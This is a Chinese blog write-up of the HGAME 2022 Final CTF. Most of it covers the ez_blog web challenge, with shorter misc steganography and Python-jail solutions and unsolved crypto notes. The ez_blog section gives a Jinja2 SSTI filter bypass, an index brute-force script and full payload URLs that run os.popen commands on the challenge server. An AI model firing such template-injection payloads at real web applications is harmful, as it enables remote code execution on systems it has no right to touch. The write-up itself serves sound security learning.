---
title: HGAME 2022 Final writeup
date: 2022-03-12 20:10:00
updated: 2022-03-12 20:10:00
tags: [ctf,security]
category: CTF
---

# HGAME 2022 Final writeup by ek1ng

## 关于排名

![image-20220313101108325](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220313101108325.png)

## WEB

### ez_blog

抢完misc的一血后回来看web了，简单看了看两题后决定先看ez_blog这个题，原因的话也很简单，sql注入我确实不太熟悉，比赛结束后一定去好好学一学，然后这个题也是比较快速的发现的注入点觉得算是心里有谱能做下去吧，就差不多8-11点左右出了个misc后11点到17点这段时间都在做这个题。

直接访问可以看到一个hexo搭建的网站，然后无论访问什么都是只有The specified key does not exist，只有一个地方可以跳到summer的github，随便看了看summer的GitHub发现这个博客的主题是他魔改的。

搜索发现一个不应该在检索内容种的帖子[HCTF flask session](https://www.anquanke.com/post/id/163975)，我不太理解为什么会能够检索到这个但是觉得确实有些联系就看了看，里面的内容提示我GitHub仓库可能有泄露的内容，去看看summer的仓库。

好吧好像没发现什么，我决定继续看看为什么key does not exist

key does not exist就是说url存在一些问题，难道是这个站点部署的时候就只有index.html然后其他的页面都被删掉了么？

随便输个路径也是一样的回显啊，难道就存在一个index.html么，那我觉得我只能去找hexo的cve然后看看有没有能打的了

![image-20220312115900402](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312115900402.png)

首先hexo是个js写的，然后找了找cve也就是一些xss的洞比较多，这里是没有明显xss点的我认为，看来问题还得绕回去，为啥The specified key does not exist

我发现直接访问index.html 或者 index.js也都不行，想来想去问题还是出现在这里应该

哦好吧应该输入`http://146.56.223.34:61289/#/index.html`少了路由的锚点

在summer自己的博客中，跳转后路径里面并不会加/static，但是我尝试去掉了也没啥用

这个问题好像是对url的拼接有问题貌似，我猜可能是通过一些url上的操作然后能够访问flag文件吧，到饭点了先吃饭

吃完饭回来然后已经放了hint:提示注意http报文的server字段，看起来前面走的都是弯路啊

那我们使用burpsuite抓包看一看

总共的话我抓到了5个不一样的包，首先是直接访问网页能够抓到3个包，会发起get请求获取网页内容，然后会发请求到search.xml，然后请求busuanzi.ibruce.info，这个是用来统计网站访问人数的，访问/static可以抓到两个包，会先GET请求/static然后再添加一个Upgrade-Insecure-Requests: 1的请求头再请求一次，总共就这么些包。

然后hint让我们注意server字段，我们可以在发给网站的各个包中的响应头中看到`server: Werkzeug/2.0.3 Python/3.11.0a5`，然后我们看一下Werkzeug是个啥

Werkzeug是一个WSGI工具包，他可以作为一个Web框架的底层库。利用python/http/server.py库实现了一个简易的http服务器。到这里也是想明白了为啥之前会搜到flask的内容，就是因为服务端是使用了Werkzeug。

了解漏洞和Werkzeug有关后，搜了一下会有很多flask debugger开启的漏洞啊，ssti漏洞啊什么的，因为flask的底层实现是Werkzeug，有可能是SSTI的漏洞，但是SSTI需要服务端接收参数，感觉这里没有传参的地方，应该不是。

https://www.anquanke.com/post/id/226900

![image-20220312133757146](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312133757146.png)

nice找到洞了

![image-20220312140145698](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312140145698.png)

路径传参的这个地方存在ssti漏洞

flag，config被过滤了

找了一些payload，基本上都是500，死活打不出来，问了一下出题人，出题人说注入点对的但是需要再深入研究一下payload，提示我注意python版本，python版本3.11.0a5，是一周前发布的新版本，看来pyload打不通的问题就在这里了，看看新版本都有啥差别。

jinjia2 ssti常用的套路

随便找个倒霉的内置类：[]、""
通过这个类获取到object类：__base__、__bases__、__mro__
通过object类获取所有子类：__subclasses__()
在子类列表中找到可以利用的类
直接调用类下面函数或使用该类空间下可用的其他模块的函数

然后看看python3.11.0a5有什么新内容

到目前为止，新的主要新功能和更改包括：

- [PEP 657](https://www.python.org/dev/peps/pep-0657/) - 在回溯中包含细粒度的错误位置
- [PEP 654](https://www.python.org/dev/peps/pep-0654/) – 例外组和例外*
- [PEP 673](https://www.python.org/dev/peps/pep-0673/) - 自我类型
- [PEP 646](https://www.python.org/dev/peps/pep-0646/) - 可变参数泛型
- [Faster Cpython 项目](https://github.com/faster-cpython)已经产生了一些令人兴奋的结果：与 3.10.0 相比，这个版本的 CPython 3.11 在性能基准的几何平均值上快了约19 % [。](http://speed.python.org/)

我觉得提醒新版本是告诉我payload只存在这个最新版本，是新版更新导致的问题，所以仔细看一看更新内容去，这里其实总共就更新4个内容，逐一排查一下看看

- 一种新的标准异常类型，`ExceptionGroup`表示一组不相关的异常一起传播。
- `except*`一种新的处理语法`ExceptionGroups`。
- 引入`TypeVar`，允许创建使用单一类型参数化的泛型。
- 我们引入了一种特殊形式`Self`，它代表绑定到封装类的类型变量。

感觉确实是没什么关系啊...我仔细看了看我觉得确实没什么关系，卡在这里了，去看会misc吧看看能不能再出一个misc

上述除了找到注入点外都是一些歪路

最后在协会各位大佬们的帮助下拿到了一血，非常不容易说实话

首先是需要发现一个问题，.被编码了，也就是说不能用.去找基类，首先是如何发现.被编码了这一问题

尝试payload`/{{'abc'}}`和`/{{'abc'.__class__}}`以及`{{'abc.__class__'}}`，发现.被过滤了，那么这时候首先就是解决.如何绕过的问题，因为ssti注入的话首先是需要找到基类，然后找到可以RCE的类，再RCE对吧，根据这两篇[Flask-jinja2 SSTI 的利用](https://xz.aliyun.com/t/9584#toc-22)和[Understanding Template Injection Vulnerabilities](https://www.paloaltonetworks.com/blog/prisma-cloud/template-injection-vulnerabilities/)，我们可以知道使用|attr('')来替代.，那么的话我们就可以逐步的注入。

![image-20220312170914823](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312170914823.png)

逐步注入后我们会发现，subclasses是获取基类，基类很多但是能使用os模块能实现rce的，需要找，这个时候写个python脚本可以解决问题

```python
import requests

counter = 0
while True:
    payload = '()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(%s)|attr("__init__")|attr("__globals__")|attr("__getitem__")("sys")' % counter
    url = 'http://146.56.223.34:61289/{{%s}}' % payload
    r = requests.get(url)
    if "404" in r.text:
        print(counter)
        break
    counter += 1
```

![image-20220312170450091](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312170450091.png)

运行之后返回结果100，这种脚本反正运行的时候心里其实没底，出现结果还挺惊喜的，找到可以实现RCE的基类是非常关键的一步，接下来我们就调用os模块的popen来看一看目录下的内容

此时的payload:`http://146.56.223.34:61289/{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(100)|attr("__init__")|attr("__globals__")|attr("__getitem__")("sys")|attr("modules")|attr("__getitem__")("os")|attr("popen")("ls /")|attr("read")()}}`

![image-20220312170602775](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312170602775.png)

发现有flag和readflag，那么flag文件我们没有读取权限，但是可以通过执行readflag这个程序来读取flag文件

最终payload:`http://146.56.223.34:61289/{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(100)|attr("__init__")|attr("__globals__")|attr("__getitem__")("sys")|attr("modules")|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()}}`

![image-20220312170545207](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312170545207.png)

然后的话linux的一些命令是真的不熟悉，最后就差读flag了都是折腾了好久，那个急啊真是（，还好也是有惊无险的做完了，注入点我其实很早就找到，我觉得解题的两个关键就是首先要能够发现.被过滤了，然后第二个是找到能够RCE的基类，接下来就一步一步走还是比较顺利的。

### pokemon v2

吃个晚饭回来就是18点了，还有最后两个小时决定尝试一下这道sql注入，虽然感觉拿这个时间看看密码也许能出个200分的但是想了想以后要专心搞web嘛也就解着看这个了，做出一半也好

首先的话注入点已经说了和week2中pokemon一样，那么就是尝试注入呗

给出的两个文章和源码，源码告诉了过滤的内容然后一篇是21年hgame week4的sql注入题另一篇是sql注入绕过滤的一些方法

过滤很严格，而且union，substr什么的都过滤了，那就不能和week2一样union注入了，只能盲注了

首先思考一下过滤怎么绕以及盲注怎么注吧，给出的21年week4的题目中使用了时间盲注的注入方法，试试看吧

确实不太做得出，还是去看看密码吧，sql注入确实学的不精，D^3的sql注入当时也是做了老半天没做出，回去一定好好补补！！！

## MISC 

### hgame真好玩

其实这题确实是每个步骤都hgame出现了，但是还是做起来有些卡吧一开始选择开了这题200分的觉得可以快速拿下，虽然最后确实拿到1血但是也是做了两个多小时，有些步骤还是卡了一小会。

拿到手的附件是二维码的碎片，先是拼二维码，ppt的背景选黑色，很容易看出边缘，下边缺了个脚需要补一下，扫码可以得到一串字符，提示回忆hgame。顺带一提，apose的在线解码工具真的很强，比别的野鸡网站好用太多啦

![uTools_1647044312476](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/uTools_1647044312476.png)

![image-20220312103754224](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312103754224.png)

这是零宽字符隐写，使用在线网站提取得到一个新的附件

![image-20220312103854517](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312103854517.png)

发现是音频，前半段从频谱图中可以发现 56418

![uTools_1647046735691](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/uTools_1647046735691.png)

后半段是sstv隐写，RXSSTV不知道为什么解不出来，我估计是麦克风没有检测到音频输入的问题，然后我尴尬的手机使用工具robot36电脑接蓝牙耳机然后把蓝牙耳机对着手机放声音，可以得到fghiulz

![image-20220312104022281](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312104022281.png)

到这里我以为两部分拼接就是全部密码，死活使不出来，使用archpr进行爆破也发现密码并不是纯数字位数也比较多，到此卡住了就，就去看了看其他题，然后看了一会气的不行，继续回来思考密码为什么不对，想到了silenteye可能还隐藏的一段，发现确实隐藏了一段

![uTools_1647049523752](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/uTools_1647049523752.png)

slilenteye中也可以得到 5663AZ

然后三部分随便拼，总共6种可能，经过尝试发现压缩包密码`fghiulz564185663AZ`

得到一张图片![image-20220312103228043](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312103228043.png)

lsb最低位按列隐写，发现base64编码的字符

![image-20220312103238839](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312103238839.png)

将base64编码的字符串转换成图片

![lsb](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/lsb.jpg)

这是data matrix编码，在线解码得到flag

![image-20220312103219197](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312103219197.png)

### Test your Python

这题是最后一会出的，确实是比较脑洞然后有点难想到吧算是，但是我觉得misc还是有逻辑的，尤其是misc的题面需要仔细看

题目描述:Test your Python ~~真的有人会做完吗？~~ Test是什么意思，真的会有人做完吗这个嘲讽又是什么意思，然后给出的hint help()又如何去使用，这些都其实是指向一个事情就是，for这个循环就是不可能绕的过去的，根本不可能直接输出，但是可能的事情是我们直接查看import进来的模块secret的内容，去直接查看flag，这个事情要想到的话应该是首先，为什么要给这个hint，help()本身是个查函数用法啊什么的一个命令，要是真的让你用help查怎么让这个值变成64，难道百度查不到对应用法吗，这显然不是给出hint的本意，这hint的本意就是让你用help()绕过循环，这个事情是绝对正确的，所以说根据hint，而且有人在写完一个题后秒出这题，我觉得肯定是只需要一步就能出，因为不可能有人拿到了flag然后直接交是二血不提交的对吧，结合这些思考，只需要先输入help()，然后再在help中直接输入secret，就可以看到导入模块的信息，自然flag变量也在其中啦

![image-20220312191210058](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220312191210058.png)

### 签到

喜提签到一血（，这次手快了一回

### HGAME LSB

根据分数和人数判断是个防AK的难题，也是没开这个题，最后一会了也不太做得出了来看看

应该是一个魔改的LSB隐写题目，（（（（确实没啥想法，在服务器上有个网页接收图片，然后给了一个图片，我猜可能是要根据源码对给出图片进行LSB隐写然后能打出flag？

## CRYPTO

### lfsr

也没什么思路

### 子集和

子集和的这个算法我懂，但是这个题不知道怎么入手

### ez_rsa

看到有两个人都出了这题密码，所以也是来看看

是共模攻击的一个变种题型，欧拉函数上做了手脚，p**3\*q为n的话，phi就为`（p-1）*p**2*（q-1）`，然后到这就卡住了

这题必须看懂论文在能说，是真看不懂啊（（（（（（（

## 总结

web只出一个题实在是有点遗憾，无奈sql注入学的太臭加上ez_blog花了我一半的时间，然后开头和结束各做出一个misc，misc上还算发挥顺利的，

lsb那个题也是上了防ak的吧应该，比赛的策略还算妥当，开题比较顺的拿下了hgame的这道回忆题，然后中间一直在做ez_blog，在summer的多次提示下也是拿下了这题然后晚饭回来看看有没有什么步骤简单的题出了个test_your_python，lfsr也是有点机会吧可不过最后时间确实不够了，回去必须好好补补sql注入
